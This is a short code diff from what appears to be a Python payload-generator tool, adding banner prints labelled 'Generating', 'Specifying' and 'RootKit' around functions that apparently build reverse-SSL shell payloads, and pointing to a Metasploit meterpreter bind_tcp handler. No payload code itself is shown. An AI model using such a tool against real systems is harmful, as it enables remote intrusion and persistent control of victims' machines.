@@ -559,8 +559,20 @@ if nscan == "1":
     a = "use python/meterpreter/bind_tcp in metasploit to connect to target"
     print(a)
 if nscan == "2":
+    clear()
+    logo()
+    print('##########################################################################################')
+    print('Generating')
     gen_rev_ssl_tcp()
+    clear()
+    logo()
+    print('##########################################################################################')
+    print('Specifying')
     postgen()
+    clear()
+    logo()
+    print('##########################################################################################')
+    print('RootKit')
     rep_syst()
     if reps == True:
         print('Generated in dist')
